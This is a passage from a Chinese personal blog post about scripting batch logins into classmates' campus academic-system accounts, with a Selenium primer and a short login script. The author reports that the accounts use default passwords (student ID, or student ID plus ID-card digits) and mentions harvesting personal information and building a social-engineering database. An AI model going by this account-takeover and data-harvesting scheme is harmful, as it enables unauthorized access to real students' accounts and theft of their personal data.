+<p>还应该再完善一下，大一的时候写<a href="http://www.addon.pub/2016/08/17/python%E7%88%AC%E5%8F%96%E6%95%B0%E5%8D%81%E4%B8%87%E7%BA%A7%E6%95%B0%E6%8D%AE/" target="_blank" rel="noopener">爬取十万级数据</a> 时候学习了将数据存储在mongodb中，但是自己本机的数据库文件一般存储的都不怎么好，完了搭个社工库的时候再改善改善吧。</p>
+<p>这届大二的比大三的好很多嘛，还是有不少人把自己的默认密码改掉的，也还算有点安全意识。<br><img src="http://oxrfjovwk.bkt.clouddn.com/18-4-18/8504381.jpg" alt=""></p>
+<h2 id="Selenium初探与环境配置"><a href="#Selenium初探与环境配置" class="headerlink" title="Selenium初探与环境配置"></a>Selenium初探与环境配置</h2><p><strong>学习selenium python需要的工具</strong><br>1、浏览器<br>2、Python<br>3、Selenium<br>4、chromedriver、IEDriverServer、geckodriver<br>5、IDE（Pycharm/Sublime/Eclipse等等）</p>
+<p><strong><font color="red">在Windows下安装对应的驱动（heclpdrober/chromedriver/IEDriverServer）</font></strong></p>
+<p><strong>这里使用的是Firefox，新版本的Firefox浏览器需要安装geckodriver驱动：</strong><br>Windows 64位：<a href="http://download.csdn.net/download/czq_520/9953528" target="_blank" rel="noopener">http://download.csdn.net/download/czq_520/9953528</a><br>Windows 32位：<a href="http://download.csdn.net/download/czq_520/9953533" target="_blank" rel="noopener">http://download.csdn.net/download/czq_520/9953533</a></p>
+<blockquote>
+<p>已经下了一份64位的，丢在网盘：<br>链接：<a href="https://pan.baidu.com/s/1HYL8DtMBhsIVzOWdmFo5fQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1HYL8DtMBhsIVzOWdmFo5fQ</a> 密码：lhjc</p>
+</blockquote>
+<p><strong>使用方法：</strong><br>    1、下载完成解压；<br>    2、将geckodriver放到python文件下<br>    3、将其添加到环境变量（python文件夹已经在环境变量，所以不用管了）</p>
+<p><strong>Chrome：</strong><br>如果需要使用Chrome浏览器或者IE浏览器，则需要对应的驱动，chromedriver，chromedriver没有64位版本，32即可驱动：<br>下载地址：<a href="https://npm.taobao.org/mirrors/chromedriver" target="_blank" rel="noopener">https://npm.taobao.org/mirrors/chromedriver</a><br>使用方法同geckodriver。</p>
+<p><strong>环境组合：</strong><br>Python3 + Selenium3.11 + Firefox59（旧版本不兼容）</p>
+<h3 id="相关基础语法"><a href="#相关基础语法" class="headerlink" title="相关基础语法"></a>相关基础语法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="comment">#创建一个到浏览器的连接</span></span><br><span class="line">driver = webdriver.Firefox()</span><br><span class="line">driver = webdriver.Chrome()</span><br><span class="line"><span class="comment">#在选定的浏览器中加载网页，调用get方法</span></span><br><span class="line">driver.get(‘http://www.baidu.com’)</span><br><span class="line"><span class="comment">#查看源代码</span></span><br><span class="line">driver.page_source</span><br><span class="line"><span class="comment">#设置要选取的元素，支持id，css selector和xpath</span></span><br><span class="line">driver.find_element_by_id()</span><br><span class="line">driver.find_element_by_css_selector()</span><br><span class="line">driver.find_element_by_xpath()</span><br><span class="line"><span class="comment">#常用的查找元素的方法</span></span><br><span class="line">find_element_by_name</span><br><span class="line">find_element_by_id</span><br><span class="line">find_element_by_xpath</span><br><span class="line">find_element_by_link_text</span><br><span class="line">find_element_by_partial_link_text</span><br><span class="line">find_element_by_tag_name</span><br><span class="line">find_element_by_class_name</span><br><span class="line">find_element_by_css_selector</span><br><span class="line"><span class="comment">#较通用的办法</span></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line">xxx.find_element(By.ID,<span class="string">"xxxx"</span>)</span><br><span class="line"><span class="comment">#元素交互操作/模拟按键输入（找到搜索框并输入相关信息）</span></span><br><span class="line">some_info = driver.find_element_by_id(<span class="string">'xxxx'</span>).send_keys(<span class="string">'MACBook'</span>)</span><br><span class="line"><span class="comment">#获取元素属性</span></span><br><span class="line">get_attribute(<span class="string">'xxxxx'</span>)</span><br><span class="line"><span class="comment">#获取文本值</span></span><br><span class="line">text</span><br><span class="line"><span class="comment">#获取ID，位置，标签名</span></span><br><span class="line">xxx.id</span><br><span class="line">xxx.location</span><br><span class="line">xxx.tag_name</span><br><span class="line">xxx.size</span><br><span class="line"><span class="comment">#简单元素操作方式</span></span><br><span class="line">清除元素内容：clear()</span><br><span class="line">模拟按键输入：send_keys()</span><br><span class="line">点击（比如获取按钮后调用此方法进行点击）：click()      </span><br><span class="line">提交表单：submit()</span><br><span class="line"><span class="comment">#切入frame以及切出来</span></span><br><span class="line">xxx.switch_to.frame(<span class="string">'xxxxxx'</span>)</span><br><span class="line">xxx.switch_to.parent_frame()</span><br><span class="line"><span class="comment">#执行JS</span></span><br><span class="line">driver.execute_script(js)</span><br><span class="line"><span class="comment">#等待</span></span><br><span class="line">当查找元素或者元素并没有立即出现的时候，隐式等待将等待一段时间再查找DOM，默认时间为<span class="number">0</span>。</span><br><span class="line">隐式等待</span><br><span class="line">到了一定的时间发现元素还没有加载，则继续等待我们指定的时间，如果超过了我们指定的时间还没有加载就会抛出异常，如果没有需要等待的时候就已经加载完毕就会立即执行。</span><br><span class="line">browser = webdriver.Chrome()</span><br><span class="line">browser.implicitly_wait(<span class="number">10</span>)</span><br><span class="line">显示等待</span><br><span class="line">指定一个等待条件，并且指定一个最长等待时间，会在这个时间内进行判断是否满足等待条件，如果成立就会立即返回，如果不成立，就会一直等待，直到等待你指定的最长等待时间，如果还是不满足，就会抛出异常，如果满足了就会正常返回</span><br><span class="line">browser = webdriver.Chrome()</span><br><span class="line">waite = WebDriverWait(browser，<span class="number">10</span>)</span><br><span class="line">input = wait.unit(判断条件（目标）)</span><br><span class="line">常用的判断条件：</span><br><span class="line">title_is 标题是某内容</span><br><span class="line">title_contains 标题包含某内容</span><br><span class="line">presence_of_element_located 元素加载出，传入定位元组，如(By.ID, <span class="string">'p'</span>)</span><br><span class="line">visibility_of_element_located 元素可见，传入定位元组</span><br><span class="line">visibility_of 可见，传入元素对象</span><br><span class="line">presence_of_all_elements_located 所有元素加载出</span><br><span class="line">text_to_be_present_in_element 某个元素文本包含某文字</span><br><span class="line">text_to_be_present_in_element_value 某个元素值包含某文字</span><br><span class="line">frame_to_be_available_and_switch_to_it frame加载并切换</span><br><span class="line">invisibility_of_element_located 元素不可见</span><br><span class="line">element_to_be_clickable 元素可点击</span><br><span class="line">staleness_of 判断一个元素是否仍在DOM，可判断页面是否已经刷新</span><br><span class="line">element_to_be_selected 元素可选择，传元素对象</span><br><span class="line">element_located_to_be_selected 元素可选择，传入定位元组</span><br><span class="line">element_selection_state_to_be 传入元素对象以及状态，相等返回<span class="keyword">True</span>，否则返回<span class="keyword">False</span></span><br><span class="line">element_located_selection_state_to_be 传入定位元组以及状态，相等返回<span class="keyword">True</span>，否则返回<span class="keyword">False</span></span><br><span class="line">alert_is_present 是否出现Alert</span><br><span class="line"><span class="comment">#浏览器的前进和后退</span></span><br><span class="line">back()</span><br><span class="line">forward()</span><br><span class="line"><span class="comment">#cookie操作</span></span><br><span class="line">get_cookies()</span><br><span class="line">delete_all_cookies()</span><br><span class="line">add_cookie(字典)</span><br><span class="line"><span class="comment">#选项卡管理</span></span><br><span class="line">通过执行js命令打开新的选项卡  window.open()</span><br><span class="line">不同的选项卡存在列表browser.window_handles</span><br><span class="line">通过 switch_to_window来进行选项卡的切换</span><br><span class="line">browser = webdriver.Chrome()</span><br><span class="line">browser.get(<span class="string">'https://www.baidu.com'</span>)</span><br><span class="line">browser.execute_script(<span class="string">'window.open()'</span>)</span><br><span class="line">browser.switch_to_window(browser.window_handles[<span class="number">1</span>])</span><br><span class="line">browser.get(<span class="string">'https://www.taobao.com'</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">browser.switch_to_window(browser.window_handles[<span class="number">0</span>])</span><br><span class="line">browser.get(<span class="string">'https://python.org'</span></span><br><span class="line"><span class="comment">#异常处理</span></span><br><span class="line">较为复杂</span><br><span class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> TimeoutException，NoSuchElementException</span><br><span class="line">使用<span class="keyword">except</span>来捕获，看是否超时与查找一个不存在的元素</span><br><span class="line"><span class="comment">#关闭浏览器</span></span><br><span class="line">driver.close()</span><br><span class="line">driver.quit()</span><br></pre></td></tr></table></figure>
+<h2 id="爬取分析以及代码编写"><a href="#爬取分析以及代码编写" class="headerlink" title="爬取分析以及代码编写"></a>爬取分析以及代码编写</h2><p>校园网充值站登录为学号 + 身份证后六位</p>
+<p>教务系统登录为：学号 + 学号</p>
+<h2 id="Selenium登录代码"><a href="#Selenium登录代码" class="headerlink" title="Selenium登录代码"></a>Selenium登录代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=<span class="string">'gb18030'</span>)</span><br><span class="line"></span><br><span class="line">index_url = <span class="string">'http://192.168.168.168/nav_login'</span></span><br><span class="line">driver = webdriver.Firefox()</span><br><span class="line">driver.get(index_url)</span><br><span class="line"><span class="comment"># 直接输入帐号密码登录就行了，抓个鸡的验证码</span></span><br><span class="line"><span class="comment"># source = driver.page_source</span></span><br><span class="line"><span class="comment"># code = re.findall('var checkcode="(.*?)";',source,re.S)[0]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入用户名和密码</span></span><br><span class="line">account = driver.find_element_by_css_selector(<span class="string">'#account'</span>).send_keys(<span class="string">'xxxxxxxxxx'</span>)</span><br><span class="line">password = driver.find_element_by_css_selector(<span class="string">'#pass'</span>).send_keys(<span class="string">'xxxxxx'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 按钮点击</span></span><br><span class="line">driver.find_element_by_css_selector(<span class="string">'#loginform &gt; div:nth-child(7) &gt; input'</span>).click()</span><br></pre></td></tr></table></figure>
+<p>（代码很简单）登陆是可以登录，但是如果用来批量进行的话用这个不是个明智的选择。</p>
+<p>到这其实也就差不多了，帐号有个四五个就够用了，手测一下就行了…</p>
+<p>selenium可以停了，但是脚本还是要继续的嘛~~</p>
+<p><a href="https://github.com/Yokeen/Spider_school_acount" target="_blank" rel="noopener">https://github.com/Yokeen/Spider_school_acount</a></p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这个站自己还得再分析分析，也刚好利用这个站再深入学习学习内网渗透…</p>
+<p>就先这样吧。</p>
+<p>祝大家学业有成，工作顺利。</p>
+<p>最近准备投简历了，也祝我自己顺利。</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="/images/wechat.png" alt="Yokeen WeChat Pay">
+          <p>微信打赏</p>
+        </div>
+      
+      
+        <div id="alipay" style="display: inline-block">
+          <img id="alipay_qr" src="/images/alipay.jpg" alt="Yokeen Alipay">
+          <p>支付宝打赏</p>
+        </div>
+      
+    </div>
+  </div>
+
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/python/" rel="tag"># python</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/04/10/CTF中的杂项小结/" rel="next" title="CTF中的杂项小结">
+                <i class="fa fa-chevron-left"></i> CTF中的杂项小结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/04/22/无题/" rel="prev" title="Onenote笔记">
+                Onenote笔记 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript">
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/images/beiy.jpg" alt="Yokeen">
+          <p class="site-author-name" itemprop="name">Yokeen</p>
+           
+              <p class="site-description motion-element" itemprop="description">无所畏惧，勇往直前</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">42</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">2</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">11</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/Yokeen" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.test404.com" title="Test404'Blog" target="_blank">Test404'Blog</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.lmxspace.com" title="l1nk3r's blog" target="_blank">l1nk3r's blog</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#场景"><span class="nav-number">1.</span> <span class="nav-text">场景</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#分析与编写"><span class="nav-number">2.</span> <span class="nav-text">分析与编写</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#具体编写流程分析"><span class="nav-number">2.1.</span> <span class="nav-text">具体编写流程分析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#脚本编写"><span class="nav-number">3.</span> <span class="nav-text">脚本编写</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#获取可用学号"><span class="nav-number">3.1.</span> <span class="nav-text">获取可用学号</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#进行教务系统批量登录并获取其个人信息"><span class="nav-number">3.2.</span> <span class="nav-text">进行教务系统批量登录并获取其个人信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Selenium初探与环境配置"><span class="nav-number">3.3.</span> <span class="nav-text">Selenium初探与环境配置</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#相关基础语法"><span class="nav-number">3.3.1.</span> <span class="nav-text">相关基础语法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#爬取分析以及代码编写"><span class="nav-number">3.4.</span> <span class="nav-text">爬取分析以及代码编写</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Selenium登录代码"><span class="nav-number">3.5.</span> <span class="nav-text">Selenium登录代码</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#后记"><span class="nav-number">4.</span> <span class="nav-text">后记</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy;  2016 - 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Yokeen</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("jwmoWLlH6Y6Lhn3O89mgQzzU-gzGzoHsz", "d2eM2PNMsQCyGqPbC5aaIyuz");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
